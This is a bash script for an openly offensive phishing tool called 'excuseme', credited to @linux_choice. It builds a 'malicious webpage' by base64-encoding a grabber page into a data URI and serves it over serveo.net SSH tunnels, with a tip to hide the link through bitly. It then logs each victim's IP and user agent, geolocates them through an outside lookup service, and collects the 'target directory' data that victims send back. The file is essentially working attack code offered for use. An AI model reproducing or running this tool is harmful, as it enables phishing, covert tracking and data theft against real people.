#!/bin/bash
# excuseme v1.0
# coded by: @linux_choice
# github.com/thelinuxchoice/excuseme
# If you use any part from this code, giving me the credits. Read the Lincense!

trap 'printf "\n";stop' 2

banner() {



printf "                                                                   _ \n"
printf "                                        |\___/|                    \\ \\ \n"
printf "                                        )     (  |\_/|              || \n"
printf "                                       =\     /= )\e[1;31ma a\e[0m \`,_.-\"\"\"\"-.  // \n"
printf "                                         )===(  =\Y_= /          \// \n"
printf "                                        /     \   \`\"\`\\       /    / \n"
printf "                                        |     |       |    \\ |   / \n"
printf "\e[1;93m  _____ ____ _  _ ___ ___   _ __  ___\e[0m  /       \       \\   /- \\  \\ \n"
printf "\e[1;93m / -_) \ / _| || (_-</ -_) | '  \/ -_)\e[0m \       /       || |  // /\` \n"
printf "\e[1;93m \___/_\_\__|\_,_/__/\___| |_|_|_\___|\e[0m  \_   _/        ((_| ((_/ \n"
printf "                                          ) ) \n"
printf " \e[1;77mv1.0 coded by @linux_choice             ( ( \n"
printf " \e[1;77mgithub.com/thelinuxchoice/excuseme\e[0m       )_) \n"

printf "\n"


}

stop() {

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1

}

dependencies() {

command -v base64 > /dev/null 2>&1 || { echo >&2 "I require base64 but it's not installed. Install it. Aborting."; exit 1; }

command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; } 


}


catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
ua=$(grep 'User-Agent:' ip.txt | cut -d '"' -f2)
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Victim IP:\e[0m\e[1;77m %s\e[0m\n" $ip
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" $server
cat ip.txt >> saved.ip.txt

if [[ -e iptracker.log ]]; then
rm -rf iptracker.log
fi

IFS='\n'
iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
IFS=$'\n'
continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
printf "\n"
hostnameip=$(grep  -o "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
if [[ $hostnameip != "" ]]; then
printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Hostname:\e[0m\e[1;77m %s\e[0m\n" $hostnameip
fi
##

reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
if [[ $reverse_dns != "" ]]; then
printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Reverse DNS:\e[0m\e[1;77m %s\e[0m\n" $reverse_dns
fi
##


if [[ $continent != "" ]]; then
printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] IP Continent:\e[0m\e[1;77m %s\e[0m\n" $continent
fi
##

country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
if [[ $country != "" ]]; then
printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] IP Country:\e[0m\e[1;77m %s\e[0m\n" $country
fi
##

state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
if [[ $state != "" ]]; then
printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] State:\e[0m\e[1;77m %s\e[0m\n" $state
fi
##
city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $city != "" ]]; then
printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] City Location:\e[0m\e[1;77m %s\e[0m\n" $city
fi
##

isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $isp != "" ]]; then
printf "\e[1;92m[\e[0m\e[1;77m+\e[0m]\e[1;92m ISP:\e[0m\e[1;77m %s\e[0m\n" $isp
fi
##

as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $as_number != "" ]]; then
printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] AS Number:\e[0m\e[1;77m %s\e[0m\n" $as_number
fi
##

ip_speed=$(grep -o "IP Address Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $ip_speed != "" ]]; then
printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] IP Address Speed:\e[0m\e[1;77m %s\e[0m\n" $ip_speed
fi
##
ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $ip_currency != "" ]]; then
printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] IP Currency:\e[0m\e[1;77m %s\e[0m\n" $ip_currency
fi
##
printf "\n"
rm -rf iptracker.log
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting Targert's dir or Next IP,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"

}

catch_cred() {

#t_dir=$(grep -o 'Dir:.*' target_dir.txt | cut -d " " -f2)
t_dir=$(head -n1 target_dir.txt)
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m]\e[0m\e[1;92m Dir:\e[0m\e[1;77m %s\n\e[0m" $t_dir

cat target_dir.txt >> saved.target_dir.txt
rm -rf target_dir.txt
printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Saved:\e[0m\e[1;77m saved.target_dir.txt\e[0m\n"
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting Next IP and Next Targert Dir, \e[0m\e[1;77mPress Ctrl + C to exit...\e[0m\n"

}

checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting IPs and target directory,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
catch_ip
rm -rf ip.txt
fi
sleep 0.5
if [[ -e "target_dir.txt" ]]; then
printf "\n\e[1;93m[\e[0m+\e[1;93m]\e[0m\e[1;92m Target Directory Found!\n"
catch_cred
rm -rf usernames.txt
fi
sleep 0.5


done 

}


server() {


printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi

if [[ $subdomain_resp == true ]]; then

$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net -R '$default_port1':localhost:4444 2> /dev/null > sendlink ' &
printf "\e[1;77m[\e[0m\e[1;31m+\e[0m\e[1;77m]\e[0m\e[1;31m TCP Forwarding:\e[0m\e[1;77m serveo.net:%s/\e[0m\n" $default_port1
sleep 8
else
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net -R '$default_port1':localhost:4444 2> /dev/null > sendlink ' &
printf "\e[1;77m[\e[0m\e[1;31m+\e[0m\e[1;77m]\e[0m\e[1;31m TCP Forwarding:\e[0m\e[1;77m serveo.net:%s/\e[0m\n" $default_port1
fi
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:3333)\e[0m\n"
fuser -k 3333/tcp > /dev/null 2>&1
php -S localhost:3333 > /dev/null 2>&1 &
sleep 4
fuser -k 4444/tcp > /dev/null 2>&1
php -S localhost:4444 > /dev/null 2>&1 &
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link
printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Obfuscation URL use bitly.com (insert above link without https)\e[0m\n'


}


payload() {

printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Building malicious webpage\e[0m\n"
sed 's+serveo_port+'$default_port1'+g' grab.html > grabdir.html

IFS=$'\n'
data_base64=$(base64 -w 0 grabdir.html)
temp64="$( echo "${data_base64}" | sed 's/[\\&*./+!]/\\&/g' )"

printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Converting webpage to base64\e[0m\n" 
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Injecting Data URI code (base64) into index2.html\e[0m\n"
sed 's+url_website+'$url'+g' template.html | sed 's+payload_name+'$payload_name'+g' | sed 's+data_base64+'${temp64}'+g ' > index2.html
server
checkfound


}

start() {
default_port1="$RANDOM" #$(seq 1111 4444 | sort -R | head -n1)
default_payload_name="excuseme"
default_url="http://www.lolcats.com"
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Web Page name (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_payload_name

read payload_name
payload_name="${payload_name:-${default_payload_name}}"

printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Phishing URL (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_url
read url
url="${url:-${default_url}}"

printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Serveo (Forwarding) Port (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_port1
read ddefault_port1
ddefault_port1="${ddefault_port1:-${default_port1}}"
default_choose_sub="Y"
default_subdomain="lolcats$RANDOM"
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
read choose_sub
choose_sub="${choose_sub:-${default_choose_sub}}"
if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
subdomain_resp=true
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
read subdomain
subdomain="${subdomain:-${default_subdomain}}"
fi


payload

}
banner
dependencies
start

